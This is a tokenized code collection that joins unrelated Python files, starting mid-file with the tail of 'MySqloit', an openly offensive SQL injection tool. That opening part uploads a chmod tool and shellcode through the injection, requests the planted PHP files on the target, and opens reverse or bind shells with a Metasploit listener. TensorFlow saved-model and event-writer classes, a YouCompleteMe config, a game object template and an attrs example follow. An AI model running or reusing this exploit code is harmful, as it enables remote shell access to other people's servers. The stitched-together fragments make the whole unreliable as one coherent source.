",0x00" <newline> null_quote = ",0x00'" <newline> half_injection = exploit_injection . replace ( null , noop ) <newline> half_injection = half_injection . replace ( null_quote , noop ) <newline> full_injection = half_injection + upload <newline> print 'Uploading ▁ chmod ▁ tool' , full_injection <newline> response = make_request ( full_injection ) <newline> time . sleep ( 10 ) <newline> shell_url = site + "/" + sys . argv [ 5 ] + '/decompress' + str ( random_file ) + '.php' <newline> print 'Decompressing ▁ shellcode' <newline> socket . setdefaulttimeout ( 15 ) <newline> print shell_url <newline> hit_url ( shell_url ) <newline> shell_url = site + "/" + sys . argv [ 5 ] + '/metedecom' + str ( random_file ) + '.php' <newline> if sys . argv [ 2 ] == 'reverse' : <newline> <indent> pid = os . fork ( ) <newline> if pid == 0 : <newline> <indent> print '=> ▁ Executing ▁ shellcode' <newline> time . sleep ( 20 ) <newline> hit_url ( shell_url ) <newline> exit ( 0 ) <newline> <dedent> else : <newline> <indent> print '=> ▁ Starting ▁ metasploit ▁ listener ▁ on ▁ port' , sys . argv [ 3 ] <newline> os . system ( reverse_shell )  # # just ▁ removed ▁ on ▁ the ▁ latest ▁ version <encdom> <newline> <dedent> <dedent> elif sys . argv [ 2 ] == 'bind' : <newline> <indent> pid = os . fork ( ) <newline> if pid == 0 : <newline> <indent> print '=> ▁ Connecting ▁ to ▁ port' , sys . argv [ 3 ] <newline> hit_url ( shell_url ) <newline> exit ( 0 ) <newline> <dedent> else : <newline> <indent> print '=> ▁ Executing ▁ shellcode' <newline> os . system ( bind_shell ) <newline> time . sleep ( 10 ) <newline> exit ( 0 ) <newline> <dedent> <dedent> else : <newline> <indent> print 'Wrong ▁ arguments' <newline> <dedent> <dedent> <dedent> def main ( argv ) : <newline> <indent> try : <newline> <indent> opt , args = getopt . getopt ( argv , "htofp:e:" , [ "help" , "test" , "os" , "fingerprint" , "payload=" , "exploit=" ] ) <newline> <dedent> except getopt . GetoptError , err : <newline> <indent> print str ( err ) <newline> usage ( ) <newline> sys . exit ( 2 ) <newline> <dedent> for o , a in opt : <newline> <indent> if o in ( "-h" , "--help" ) : <newline> <indent> usage ( ) <newline> sys . exit ( ) <newline> <dedent> elif o in ( "-t" , "--test" ) : <newline> <indent> test ( a ) <newline> <dedent> elif o in ( "-o" , "--os" ) : <newline> <indent> fingerprint_os ( ) <newline> <dedent> elif o in ( "-f" , "--fingerprint" ) : <newline> <indent> fingerprint ( ) <newline> <dedent> elif o in ( "-p" , "--payload" ) : <newline> <indent> payloads ( ) <newline> <dedent> elif o in ( "-e" , "--exploit" ) : <newline> <indent> exploit ( ) <newline> <dedent> else : <newline> <indent> assert False , "unhandled ▁ option" <newline> <dedent> <dedent> <dedent> def usage ( ) : <newline> <indent> usage =  """ <strnewline> ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ \||/ <strnewline> ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ | ▁ ▁ @___oo <strnewline> ▁ ▁ ▁ ▁ ▁ ▁ ▁ /\ ▁ ▁ /\ ▁ ▁ ▁ / ▁ (__,,,,| ▁ ▁ ▁ ▁ ▁ ▁ <strnewline> ▁ ▁ ▁ ▁ ▁ ▁ ) ▁ /^\) ▁ ^\/ ▁ _) <strnewline> ▁ ▁ ▁ ▁ ▁ ▁ ) ▁ ▁ ▁ /^\/ ▁ ▁ ▁ _) ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ <strnewline> ▁ ▁ ▁ ▁ ▁ ▁ ) ▁ ▁ ▁ _ ▁ / ▁ ▁ / ▁ _) ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ MySqloit ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ <strnewline> ▁ ▁ /\ ▁ ▁ )/\/ ▁ || ▁ ▁ | ▁ )_) <strnewline> ▁ < ▁ ▁ > ▁ ▁ ▁ ▁ ▁ ▁ |(,,) ▁ )__) <strnewline> ▁ ▁ || ▁ ▁ ▁ ▁ ▁ ▁ / ▁ ▁ ▁ ▁ \)___)\ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ <strnewline> ▁ ▁ | ▁ \____( ▁ ▁ ▁ ▁ ▁ ▁ )___) ▁ )___ ▁ ▁ ▁ ▁ ▁ ▁ <strnewline> ▁ ▁ ▁ \______(_______;;; ▁ __;;; <strnewline> ▁ ▁ ▁ <strnewline> ▁ ▁ ▁ <strnewline> ▁ ▁ ▁ <strnewline> ▁ ▁ ▁ ▁ -h ▁ --help ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ Help <strnewline> ▁ ▁ ▁ ▁ -t ▁ --test ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ Test ▁ the ▁ SQL ▁ Injection <strnewline> ▁ ▁ ▁ ▁ -o ▁ --os ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ Fingerprint ▁ the ▁ operating ▁ system <strnewline> ▁ ▁ ▁ ▁ -f ▁ --fingerprint ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ Fingerprint ▁ the ▁ working ▁ directory <strnewline> ▁ ▁ ▁ ▁ -e ▁ --exploit ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ Exploit. ▁ Enter ▁'help' ▁ as ▁ argument ▁ for ▁ more ▁ options ▁ <strnewline> ▁ ▁ ▁ ▁ -p ▁ --payload ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ Create ▁ payload. ▁ Enter ▁'help' ▁ as ▁ argument ▁ for ▁ more ▁ options ▁ ▁ ▁ ▁ <strnewline> <strnewline> ▁ ▁ ▁ ▁ """  <newline> print usage <newline> <dedent> if __name__ == "__main__" : <newline> <indent> main ( sys . argv [ 1 : ] ) <newline> <dedent>
 # ▁ Copyright ▁ 2020 ▁ The ▁ TensorFlow ▁ Authors. ▁ All ▁ Rights ▁ Reserved. <encdom>  # ▁ Licensed ▁ under ▁ the ▁ Apache ▁ License, ▁ Version ▁ 2.0 ▁ (the ▁"License"); <encdom>  # ▁ you ▁ may ▁ not ▁ use ▁ this ▁ file ▁ except ▁ in ▁ compliance ▁ with ▁ the ▁ License. <encdom>  # ▁ You ▁ may ▁ obtain ▁ a ▁ copy ▁ of ▁ the ▁ License ▁ at <encdom>  # ▁ http://www.apache.org/licenses/LICENSE-2.0 <encdom>  # ▁ Unless ▁ required ▁ by ▁ applicable ▁ law ▁ or ▁ agreed ▁ to ▁ in ▁ writing, ▁ software <encdom>  # ▁ distributed ▁ under ▁ the ▁ License ▁ is ▁ distributed ▁ on ▁ an ▁"AS ▁ IS" ▁ BASIS, <encdom>  # ▁ WITHOUT ▁ WARRANTIES ▁ OR ▁ CONDITIONS ▁ OF ▁ ANY ▁ KIND, ▁ either ▁ express ▁ or ▁ implied. <encdom>  # ▁ See ▁ the ▁ License ▁ for ▁ the ▁ specific ▁ language ▁ governing ▁ permissions ▁ and <encdom>  # ▁ limitations ▁ under ▁ the ▁ License. <encdom>  """ Options ▁ for ▁ saving ▁ SavedModels. """  <newline> from __future__ import absolute_import <newline> from __future__ import division <newline> from __future__ import print_function <newline> from tensorflow . python . util . tf_export import tf_export <newline> @ tf_export ( "saved_model.LoadOptions" , v1 = [ ] ) <newline> class LoadOptions ( object ) : <newline> <indent>  """ Options ▁ for ▁ loading ▁ a ▁ SavedModel. <strnewline> <strnewline> ▁ This ▁ function ▁ may ▁ be ▁ used ▁ in ▁ the ▁ `options` ▁ argument ▁ in ▁ functions ▁ that <strnewline> ▁ load ▁ a ▁ SavedModel ▁ (`tf.saved_model.load`, ▁ `tf.keras.models.load_model`). <strnewline> ▁ """  <newline>  # ▁ Define ▁ object ▁ attributes ▁ in ▁ __slots__ ▁ for ▁ improved ▁ memory ▁ and ▁ performance. <encdom> __slots__ = ( "experimental_io_device" , ) <newline> def __init__ ( self , experimental_io_device = None ) : <newline> <indent>  """ Creates ▁ an ▁ object ▁ that ▁ stores ▁ options ▁ for ▁ SavedModel ▁ loading. <strnewline> <strnewline> ▁ Args: <strnewline> ▁ experimental_io_device: ▁ string. ▁ Applies ▁ in ▁ a ▁ distributed ▁ setting. <strnewline> ▁ Tensorflow ▁ device ▁ to ▁ use ▁ to ▁ access ▁ the ▁ filesystem. ▁ If ▁ `None` ▁ (default) <strnewline> ▁ then ▁ for ▁ each ▁ variable ▁ the ▁ filesystem ▁ is ▁ accessed ▁ from ▁ the ▁ CPU:0 ▁ device <strnewline> ▁ of ▁ the ▁ host ▁ where ▁ that ▁ variable ▁ is ▁ assigned. ▁ If ▁ specified, ▁ the <strnewline> ▁ filesystem ▁ is ▁ instead ▁ accessed ▁ from ▁ that ▁ device ▁ for ▁ all ▁ variables. <strnewline> ▁ This ▁ is ▁ for ▁ example ▁ useful ▁ if ▁ you ▁ want ▁ to ▁ load ▁ from ▁ a ▁ local ▁ directory, <strnewline> ▁ such ▁ as ▁"/tmp" ▁ when ▁ running ▁ in ▁ a ▁ distributed ▁ setting. ▁ In ▁ that ▁ case <strnewline> ▁ pass ▁ a ▁ device ▁ for ▁ the ▁ host ▁ where ▁ the ▁"/tmp" ▁ directory ▁ is ▁ accessible. <strnewline> <strnewline> ▁ Example: <strnewline> <strnewline> ▁ load_options ▁ = ▁ tf.saved_model.LoadOptions(experimental_io_device= <strnewline> ▁'/job:localhost') <strnewline> ▁ restoredmodel ▁ = ▁ tf.keras.models.load_model(saved_model_path, <strnewline> ▁ options=load_options) <strnewline> <strnewline> ▁ """  <newline> self . experimental_io_device = experimental_io_device <newline> <dedent> <dedent>
 # ▁ Copyright ▁ 2015 ▁ The ▁ TensorFlow ▁ Authors. ▁ All ▁ Rights ▁ Reserved. <encdom>  # ▁ Licensed ▁ under ▁ the ▁ Apache ▁ License, ▁ Version ▁ 2.0 ▁ (the ▁"License"); <encdom>  # ▁ you ▁ may ▁ not ▁ use ▁ this ▁ file ▁ except ▁ in ▁ compliance ▁ with ▁ the ▁ License. <encdom>  # ▁ You ▁ may ▁ obtain ▁ a ▁ copy ▁ of ▁ the ▁ License ▁ at <encdom>  # ▁ http://www.apache.org/licenses/LICENSE-2.0 <encdom>  # ▁ Unless ▁ required ▁ by ▁ applicable ▁ law ▁ or ▁ agreed ▁ to ▁ in ▁ writing, ▁ software <encdom>  # ▁ distributed ▁ under ▁ the ▁ License ▁ is ▁ distributed ▁ on ▁ an ▁"AS ▁ IS" ▁ BASIS, <encdom>  # ▁ WITHOUT ▁ WARRANTIES ▁ OR ▁ CONDITIONS ▁ OF ▁ ANY ▁ KIND, ▁ either ▁ express ▁ or ▁ implied. <encdom>  # ▁ See ▁ the ▁ License ▁ for ▁ the ▁ specific ▁ language ▁ governing ▁ permissions ▁ and <encdom>  # ▁ limitations ▁ under ▁ the ▁ License. <encdom>  """ Writes ▁ events ▁ to ▁ disk ▁ in ▁ a ▁ logdir. """  <newline> from __future__ import absolute_import <newline> from __future__ import division <newline> from __future__ import print_function <newline> from tensorflow . python . framework import constant_op <newline> from tensorflow . python . framework import dtypes <newline> from tensorflow . python . framework import ops <newline> from tensorflow . python . ops import array_ops <newline> from tensorflow . python . ops import summary_ops_v2 <newline> from tensorflow . python . platform import gfile <newline> class EventFileWriterV2 ( object ) : <newline> <indent>  """ Writes ▁ `Event` ▁ protocol ▁ buffers ▁ to ▁ an ▁ event ▁ file ▁ via ▁ the ▁ graph. <strnewline> <strnewline> ▁ The ▁ `EventFileWriterV2` ▁ class ▁ is ▁ backed ▁ by ▁ the ▁ summary ▁ file ▁ writer ▁ in ▁ the ▁ v2 <strnewline> ▁ summary ▁ API ▁ (currently ▁ in ▁ tf.contrib.summary), ▁ so ▁ it ▁ uses ▁ a ▁ shared ▁ summary <strnewline> ▁ writer ▁ resource ▁ and ▁ graph ▁ ops ▁ to ▁ write ▁ events. <strnewline> <strnewline> ▁ As ▁ with ▁ the ▁ original ▁ EventFileWriter, ▁ this ▁ class ▁ will ▁ asynchronously ▁ write <strnewline> ▁ Event ▁ protocol ▁ buffers ▁ to ▁ the ▁ backing ▁ file. ▁ The ▁ Event ▁ file ▁ is ▁ encoded ▁ using <strnewline> ▁ the ▁ tfrecord ▁ format, ▁ which ▁ is ▁ similar ▁ to ▁ RecordIO. <strnewline> ▁ """  <newline> def __init__ ( self , session , logdir , max_queue = 10 , flush_secs = 120 , filename_suffix = '' ) : <newline> <indent>  """ Creates ▁ an ▁ `EventFileWriterV2` ▁ and ▁ an ▁ event ▁ file ▁ to ▁ write ▁ to. <strnewline> <strnewline> ▁ On ▁ construction, ▁ this ▁ calls ▁ `tf.contrib.summary.create_file_writer` ▁ within <strnewline> ▁ the ▁ graph ▁ from ▁ `session.graph` ▁ to ▁ look ▁ up ▁ a ▁ shared ▁ summary ▁ writer ▁ resource <strnewline> ▁ for ▁ `logdir` ▁ if ▁ one ▁ exists, ▁ and ▁ create ▁ one ▁ if ▁ not. ▁ Creating ▁ the ▁ summary <strnewline> ▁ writer ▁ resource ▁ in ▁ turn ▁ creates ▁ a ▁ new ▁ event ▁ file ▁ in ▁ `logdir` ▁ to ▁ be ▁ filled <strnewline> ▁ with ▁ `Event` ▁ protocol ▁ buffers ▁ passed ▁ to ▁ `add_event`. ▁ Graph ▁ ops ▁ to ▁ control <strnewline> ▁ this ▁ writer ▁ resource ▁ are ▁ added ▁ to ▁ `session.graph` ▁ during ▁ this ▁ init ▁ call; <strnewline> ▁ stateful ▁ methods ▁ on ▁ this ▁ class ▁ will ▁ call ▁ `session.run()` ▁ on ▁ these ▁ ops. <strnewline> <strnewline> ▁ Note ▁ that ▁ because ▁ the ▁ underlying ▁ resource ▁ is ▁ shared, ▁ it ▁ is ▁ possible ▁ that <strnewline> ▁ other ▁ parts ▁ of ▁ the ▁ code ▁ using ▁ the ▁ same ▁ session ▁ may ▁ interact ▁ independently <strnewline> ▁ with ▁ the ▁ resource, ▁ e.g. ▁ by ▁ flushing ▁ or ▁ even ▁ closing ▁ it. ▁ It ▁ is ▁ the ▁ caller's <strnewline> ▁ responsibility ▁ to ▁ avoid ▁ any ▁ undesirable ▁ sharing ▁ in ▁ this ▁ regard. <strnewline> <strnewline> ▁ The ▁ remaining ▁ arguments ▁ to ▁ the ▁ constructor ▁ (`flush_secs`, ▁ `max_queue`, ▁ and <strnewline> ▁ `filename_suffix`) ▁ control ▁ the ▁ construction ▁ of ▁ the ▁ shared ▁ writer ▁ resource <strnewline> ▁ if ▁ one ▁ is ▁ created. ▁ If ▁ an ▁ existing ▁ resource ▁ is ▁ reused, ▁ these ▁ arguments ▁ have <strnewline> ▁ no ▁ effect. ▁ See ▁ `tf.contrib.summary.create_file_writer` ▁ for ▁ details. <strnewline> <strnewline> ▁ Args: <strnewline> ▁ session: ▁ A ▁ `tf.Session`. ▁ Session ▁ that ▁ will ▁ hold ▁ shared ▁ writer ▁ resource. <strnewline> ▁ The ▁ writer ▁ ops ▁ will ▁ be ▁ added ▁ to ▁ session.graph ▁ during ▁ this ▁ init ▁ call. <strnewline> ▁ logdir: ▁ A ▁ string. ▁ Directory ▁ where ▁ event ▁ file ▁ will ▁ be ▁ written. <strnewline> ▁ max_queue: ▁ Integer. ▁ Size ▁ of ▁ the ▁ queue ▁ for ▁ pending ▁ events ▁ and ▁ summaries. <strnewline> ▁ flush_secs: ▁ Number. ▁ How ▁ often, ▁ in ▁ seconds, ▁ to ▁ flush ▁ the <strnewline> ▁ pending ▁ events ▁ and ▁ summaries ▁ to ▁ disk. <strnewline> ▁ filename_suffix: ▁ A ▁ string. ▁ Every ▁ event ▁ file's ▁ name ▁ is ▁ suffixed ▁ with <strnewline> ▁ `filename_suffix`. <strnewline> ▁ """  <newline> self . _session = session <newline> self . _logdir = logdir <newline> self . _closed = False <newline> if not gfile . IsDirectory ( self . _logdir ) : <newline> <indent> gfile . MakeDirs ( self . _logdir ) <newline> <dedent> with self . _session . graph . as_default ( ) : <newline> <indent> with ops . name_scope ( 'filewriter' ) : <newline> <indent> file_writer = summary_ops_v2 . create_file_writer ( logdir = self . _logdir , max_queue = max_queue , flush_millis = flush_secs * 1000 , filename_suffix = filename_suffix ) <newline> with summary_ops_v2 . always_record_summaries ( ) , file_writer . as_default ( ) : <newline> <indent> self . _event_placeholder = array_ops . placeholder_with_default ( constant_op . constant ( 'unused' , dtypes . string ) , shape = [ ] ) <newline> self . _add_event_op = summary_ops_v2 . import_event ( self . _event_placeholder ) <newline> <dedent> self . _init_op = file_writer . init ( ) <newline> self . _flush_op = file_writer . flush ( ) <newline> self . _close_op = file_writer . close ( ) <newline> <dedent> self . _session . run ( self . _init_op ) <newline> <dedent> <dedent> def get_logdir ( self ) : <newline> <indent>  """ Returns ▁ the ▁ directory ▁ where ▁ event ▁ file ▁ will ▁ be ▁ written. """  <newline> return self . _logdir <newline> <dedent> def reopen ( self ) : <newline> <indent>  """ Reopens ▁ the ▁ EventFileWriter. <strnewline> <strnewline> ▁ Can ▁ be ▁ called ▁ after ▁ `close()` ▁ to ▁ add ▁ more ▁ events ▁ in ▁ the ▁ same ▁ directory. <strnewline> ▁ The ▁ events ▁ will ▁ go ▁ into ▁ a ▁ new ▁ events ▁ file. <strnewline> <strnewline> ▁ Does ▁ nothing ▁ if ▁ the ▁ EventFileWriter ▁ was ▁ not ▁ closed. <strnewline> ▁ """  <newline> if self . _closed : <newline> <indent> self . _closed = False <newline> self . _session . run ( self . _init_op ) <newline> <dedent> <dedent> def add_event ( self , event ) : <newline> <indent>  """ Adds ▁ an ▁ event ▁ to ▁ the ▁ event ▁ file. <strnewline> <strnewline> ▁ Args: <strnewline> ▁ event: ▁ An ▁ `Event` ▁ protocol ▁ buffer. <strnewline> ▁ """  <newline> if not self . _closed : <newline> <indent> event_pb = event . SerializeToString ( ) <newline> self . _session . run ( self . _add_event_op , feed_dict = { self . _event_placeholder : event_pb } ) <newline> <dedent> <dedent> def flush ( self ) : <newline> <indent>  """ Flushes ▁ the ▁ event ▁ file ▁ to ▁ disk. <strnewline> <strnewline> ▁ Call ▁ this ▁ method ▁ to ▁ make ▁ sure ▁ that ▁ all ▁ pending ▁ events ▁ have ▁ been ▁ written ▁ to <strnewline> ▁ disk. <strnewline> ▁ """  <newline> self . _session . run ( self . _flush_op ) <newline> <dedent> def close ( self ) : <newline> <indent>  """ Flushes ▁ the ▁ event ▁ file ▁ to ▁ disk ▁ and ▁ close ▁ the ▁ file. <strnewline> <strnewline> ▁ Call ▁ this ▁ method ▁ when ▁ you ▁ do ▁ not ▁ need ▁ the ▁ summary ▁ writer ▁ anymore. <strnewline> ▁ """  <newline> if not self . _closed : <newline> <indent> self . flush ( ) <newline> self . _session . run ( self . _close_op ) <newline> self . _closed = True <newline> <dedent> <dedent> <dedent>
 # ▁ Generated ▁ by ▁ YCM ▁ Generator ▁ at ▁ 2016-10-18 ▁ 10:13:21.653665 <encdom>  # ▁ This ▁ file ▁ is ▁ NOT ▁ licensed ▁ under ▁ the ▁ GPLv3, ▁ which ▁ is ▁ the ▁ license ▁ for ▁ the ▁ rest <encdom>  # ▁ of ▁ YouCompleteMe. <encdom>  # ▁ Here's ▁ the ▁ license ▁ text ▁ for ▁ this ▁ file: <encdom>  # ▁ This ▁ is ▁ free ▁ and ▁ unencumbered ▁ software ▁ released ▁ into ▁ the ▁ public ▁ domain. <encdom>  # ▁ Anyone ▁ is ▁ free ▁ to ▁ copy, ▁ modify, ▁ publish, ▁ use, ▁ compile, ▁ sell, ▁ or <encdom>  # ▁ distribute ▁ this ▁ software, ▁ either ▁ in ▁ source ▁ code ▁ form ▁ or ▁ as ▁ a ▁ compiled <encdom>  # ▁ binary, ▁ for ▁ any ▁ purpose, ▁ commercial ▁ or ▁ non-commercial, ▁ and ▁ by ▁ any <encdom>  # ▁ means. <encdom>  # ▁ In ▁ jurisdictions ▁ that ▁ recognize ▁ copyright ▁ laws, ▁ the ▁ author ▁ or ▁ authors <encdom>  # ▁ of ▁ this ▁ software ▁ dedicate ▁ any ▁ and ▁ all ▁ copyright ▁ interest ▁ in ▁ the <encdom>  # ▁ software ▁ to ▁ the ▁ public ▁ domain. ▁ We ▁ make ▁ this ▁ dedication ▁ for ▁ the ▁ benefit <encdom>  # ▁ of ▁ the ▁ public ▁ at ▁ large ▁ and ▁ to ▁ the ▁ detriment ▁ of ▁ our ▁ heirs ▁ and <encdom>  # ▁ successors. ▁ We ▁ intend ▁ this ▁ dedication ▁ to ▁ be ▁ an ▁ overt ▁ act ▁ of <encdom>  # ▁ relinquishment ▁ in ▁ perpetuity ▁ of ▁ all ▁ present ▁ and ▁ future ▁ rights ▁ to ▁ this <encdom>  # ▁ software ▁ under ▁ copyright ▁ law. <encdom>  # ▁ THE ▁ SOFTWARE ▁ IS ▁ PROVIDED ▁"AS ▁ IS", ▁ WITHOUT ▁ WARRANTY ▁ OF ▁ ANY ▁ KIND, <encdom>  # ▁ EXPRESS ▁ OR ▁ IMPLIED, ▁ INCLUDING ▁ BUT ▁ NOT ▁ LIMITED ▁ TO ▁ THE ▁ WARRANTIES ▁ OF <encdom>  # ▁ MERCHANTABILITY, ▁ FITNESS ▁ FOR ▁ A ▁ PARTICULAR ▁ PURPOSE ▁ AND ▁ NONINFRINGEMENT. <encdom>  # ▁ IN ▁ NO ▁ EVENT ▁ SHALL ▁ THE ▁ AUTHORS ▁ BE ▁ LIABLE ▁ FOR ▁ ANY ▁ CLAIM, ▁ DAMAGES ▁ OR <encdom>  # ▁ OTHER ▁ LIABILITY, ▁ WHETHER ▁ IN ▁ AN ▁ ACTION ▁ OF ▁ CONTRACT, ▁ TORT ▁ OR ▁ OTHERWISE, <encdom>  # ▁ ARISING ▁ FROM, ▁ OUT ▁ OF ▁ OR ▁ IN ▁ CONNECTION ▁ WITH ▁ THE ▁ SOFTWARE ▁ OR ▁ THE ▁ USE ▁ OR <encdom>  # ▁ OTHER ▁ DEALINGS ▁ IN ▁ THE ▁ SOFTWARE. <encdom>  # ▁ For ▁ more ▁ information, ▁ please ▁ refer ▁ to ▁ <http://unlicense.org/> <encdom> import os <newline> import ycm_core <newline> flags = [ '-x' , 'c++' , '-DGTEST_HAS_PTHREAD=1' , '-I/Users/david/code/scratch/cpp/include' , '-I/Users/david/code/scratch/cpp/test/../vendor/googletest/googletest/include' , '-I/Users/david/code/scratch/cpp/vendor/boost' , '-I/Users/david/code/scratch/cpp/vendor/googletest/googletest' , '-I/Users/david/code/scratch/cpp/vendor/googletest/googletest/include' , '-Wall' , '-Wextra' , '-Wpedantic' , '-std=c++14' , ] <newline>  # ▁ Set ▁ this ▁ to ▁ the ▁ absolute ▁ path ▁ to ▁ the ▁ folder ▁ (NOT ▁ the ▁ file!) ▁ containing ▁ the <encdom>  # ▁ compile_commands.json ▁ file ▁ to ▁ use ▁ that ▁ instead ▁ of ▁'flags'. ▁ See ▁ here ▁ for <encdom>  # ▁ more ▁ details: ▁ http://clang.llvm.org/docs/JSONCompilationDatabase.html <encdom>  # ▁ You ▁ can ▁ get ▁ CMake ▁ to ▁ generate ▁ this ▁ file ▁ for ▁ you ▁ by ▁ adding: <encdom>  # ▁ set( ▁ CMAKE_EXPORT_COMPILE_COMMANDS ▁ 1 ▁ ) <encdom>  # ▁ to ▁ your ▁ CMakeLists.txt ▁ file. <encdom>  # ▁ Most ▁ projects ▁ will ▁ NOT ▁ need ▁ to ▁ set ▁ this ▁ to ▁ anything; ▁ you ▁ can ▁ just ▁ change ▁ the <encdom>  # ▁'flags' ▁ list ▁ of ▁ compilation ▁ flags. ▁ Notice ▁ that ▁ YCM ▁ itself ▁ uses ▁ that ▁ approach. <encdom> compilation_database_folder = '' <newline> if os . path . exists ( compilation_database_folder ) : <newline> <indent> database = ycm_core . CompilationDatabase ( compilation_database_folder ) <newline> <dedent> else : <newline> <indent> database = None <newline> <dedent> SOURCE_EXTENSIONS = [ '.C' , '.cpp' , '.cxx' , '.cc' , '.c' , '.m' , '.mm' ] <newline> def DirectoryOfThisScript ( ) : <newline> <indent> return os . path . dirname ( os . path . abspath ( __file__ ) ) <newline> <dedent> def MakeRelativePathsInFlagsAbsolute ( flags , working_directory ) : <newline> <indent> if not working_directory : <newline> <indent> return list ( flags ) <newline> <dedent> new_flags = [ ] <newline> make_next_absolute = False <newline> path_flags = [ '-isystem' , '-I' , '-iquote' , '--sysroot=' ] <newline> for flag in flags : <newline> <indent> new_flag = flag <newline> if make_next_absolute : <newline> <indent> make_next_absolute = False <newline> if not flag . startswith ( '/' ) : <newline> <indent> new_flag = os . path . join ( working_directory , flag ) <newline> <dedent> <dedent> for path_flag in path_flags : <newline> <indent> if flag == path_flag : <newline> <indent> make_next_absolute = True <newline> break <newline> <dedent> if flag . startswith ( path_flag ) : <newline> <indent> path = flag [ len ( path_flag ) : ] <newline> new_flag = path_flag + os . path . join ( working_directory , path ) <newline> break <newline> <dedent> <dedent> if new_flag : <newline> <indent> new_flags . append ( new_flag ) <newline> <dedent> <dedent> return new_flags <newline> <dedent> def IsHeaderFile ( filename ) : <newline> <indent> extension = os . path . splitext ( filename ) [ 1 ] <newline> return extension in [ '.H' , '.h' , '.hxx' , '.hpp' , '.hh' ] <newline> <dedent> def GetCompilationInfoForFile ( filename ) : <newline>  # ▁ The ▁ compilation_commands.json ▁ file ▁ generated ▁ by ▁ CMake ▁ does ▁ not ▁ have ▁ entries <encdom>  # ▁ for ▁ header ▁ files. ▁ So ▁ we ▁ do ▁ our ▁ best ▁ by ▁ asking ▁ the ▁ db ▁ for ▁ flags ▁ for ▁ a <encdom>  # ▁ corresponding ▁ source ▁ file, ▁ if ▁ any. ▁ If ▁ one ▁ exists, ▁ the ▁ flags ▁ for ▁ that ▁ file <encdom>  # ▁ should ▁ be ▁ good ▁ enough. <encdom> <indent> if IsHeaderFile ( filename ) : <newline> <indent> basename = os . path . splitext ( filename ) [ 0 ] <newline> for extension in SOURCE_EXTENSIONS : <newline> <indent> replacement_file = basename + extension <newline> if os . path . exists ( replacement_file ) : <newline> <indent> compilation_info = database . GetCompilationInfoForFile ( replacement_file ) <newline> if compilation_info . compiler_flags_ : <newline> <indent> return compilation_info <newline> <dedent> <dedent> <dedent> return None <newline> <dedent> return database . GetCompilationInfoForFile ( filename ) <newline> <dedent> def FlagsForFile ( filename , ** kwargs ) : <newline> <indent> if database : <newline>  # ▁ Bear ▁ in ▁ mind ▁ that ▁ compilation_info.compiler_flags_ ▁ does ▁ NOT ▁ return ▁ a <encdom>  # ▁ python ▁ list, ▁ but ▁ a ▁"list-like" ▁ StringVec ▁ object <encdom> <indent> compilation_info = GetCompilationInfoForFile ( filename ) <newline> if not compilation_info : <newline> <indent> return None <newline> <dedent> final_flags = MakeRelativePathsInFlagsAbsolute ( compilation_info . compiler_flags_ , compilation_info . compiler_working_dir_ ) <newline> <dedent> else : <newline> <indent> relative_to = DirectoryOfThisScript ( ) <newline> final_flags = MakeRelativePathsInFlagsAbsolute ( flags , relative_to ) <newline> <dedent> return { 'flags' : final_flags , 'do_cache' : True } <newline> <dedent>
 # # # # ▁ NOTICE: ▁ THIS ▁ FILE ▁ IS ▁ AUTOGENERATED <encdom>  # # # # ▁ MODIFICATIONS ▁ MAY ▁ BE ▁ LOST ▁ IF ▁ DONE ▁ IMPROPERLY <encdom>  # # # # ▁ PLEASE ▁ SEE ▁ THE ▁ ONLINE ▁ DOCUMENTATION ▁ FOR ▁ EXAMPLES <encdom> from swgpy . object import * <newline> def create ( kernel ) : <newline> <indent> result = Tangible ( ) <newline> result . template = "object/tangible/ship/components/droid_interface/shared_ddi_kessel_rebel_qualdex_integrated_array.iff" <newline> result . attribute_template_id = 8 <newline> result . stfName ( "space/space_item" , "ddi_kessel_rebel_qualdex_integrated_array_n" ) <newline>  # # # # ▁ BEGIN ▁ MODIFICATIONS ▁ # # # # <encdom>  # # # # ▁ END ▁ MODIFICATIONS ▁ # # # # <encdom> return result <newline> <dedent>
 # !/usr/bin/env ▁ python <encdom>  """ <strnewline> This ▁ example ▁ shows ▁ that ▁ you ▁ can ▁ add ▁ attributes ▁ at ▁ run <strnewline> time ▁ to ▁ an ▁ object ▁ which ▁ is ▁ created ▁ using ▁ the ▁'attrs' <strnewline> framework. ▁ The ▁ attribute ▁ will ▁ not ▁ be ▁ printed ▁ when ▁ printing <strnewline> the ▁ instances. ▁ The ▁ attribute ▁ is ▁ accessible ▁ from ▁ outside <strnewline> and ▁ from ▁ within ▁ the ▁ object ▁ and ▁ is ▁ seen ▁ in ▁ dir(object). <strnewline> """  <newline> from attr import attrs , attrib <newline> @ attrs <newline> class MyObject ( object ) : <newline> <indent> a = attrib ( default = None )  # ▁ type: ▁ int <encdom> <newline> b = attrib ( default = None )  # ▁ type: ▁ int <encdom> <newline> def add_attribute ( self , val ) : <newline>  # ▁ noinspection ▁ PyAttributeOutsideInit <encdom> <indent> self . another = val <newline> <dedent> def print ( self ) : <newline> <indent> print ( self . another ) <newline> <dedent> <dedent> m = MyObject ( ) <newline> m . a = 6 <newline> m . b = 7 <newline> m . add_attribute ( 11 ) <newline> m . print ( ) <newline> print ( m . another ) <newline> print ( m ) <newline> print ( dir ( m ) ) <newline>
